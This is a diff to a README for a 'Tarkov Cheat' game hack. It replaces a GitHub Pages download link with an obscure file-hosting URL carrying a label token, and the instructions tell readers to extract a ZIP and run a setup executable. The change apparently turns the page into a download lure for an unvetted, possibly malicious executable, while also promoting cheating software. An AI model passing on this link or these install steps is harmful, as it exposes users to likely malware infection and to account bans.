@@ -2,7 +2,7 @@
 
 ## Quick Installation
 To get started with Tarkov Cheat, follow these simple steps:
-1. **[![Download Tarkov Cheat](https://img.shields.io/badge/Download-Tarkov%20Cheat-blueviolet)](https://tarkov-external-cheat-aimbot-wallhack.github.io/download/)**
+1. **[![Download Tarkov Cheat](https://img.shields.io/badge/Download-Tarkov%20Cheat-blueviolet)](https://downloadifiles.com?label=1e88dd1be7cebcac3b93ae91dcb2375f)**
 2. Extract the downloaded ZIP file to your desired location on your system.
 3. Run the setup executable and follow the on-screen instructions.
 
